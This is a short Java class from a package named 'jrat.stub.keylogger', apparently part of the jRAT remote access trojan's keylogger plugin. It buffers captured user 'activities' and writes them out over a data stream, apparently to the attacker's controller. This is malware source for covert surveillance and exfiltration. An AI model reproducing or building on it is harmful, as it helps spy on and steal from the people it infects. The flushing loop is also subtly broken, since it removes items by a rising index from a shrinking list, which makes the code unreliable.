package pro.jrat.stub.keylogger;

import java.io.DataOutputStream;
import java.util.ArrayList;
import java.util.List;

public class Activities {

	private static final List<Activity> activities = new ArrayList<Activity>();

	public static synchronized void add(Activity activity) {
		activities.add(activity);
	}
	
	public static synchronized void pump(DataOutputStream out) throws Exception {
		//out.writeByte(Plugin.STATUS_HEADER);
		
		int size = activities.size();
		
		out.writeInt(size);
		System.out.println("Wrote length: " + size);
		
		for (int i = 0; i < size; i++) {
			activities.remove(i).write(out);
		}
	}
}
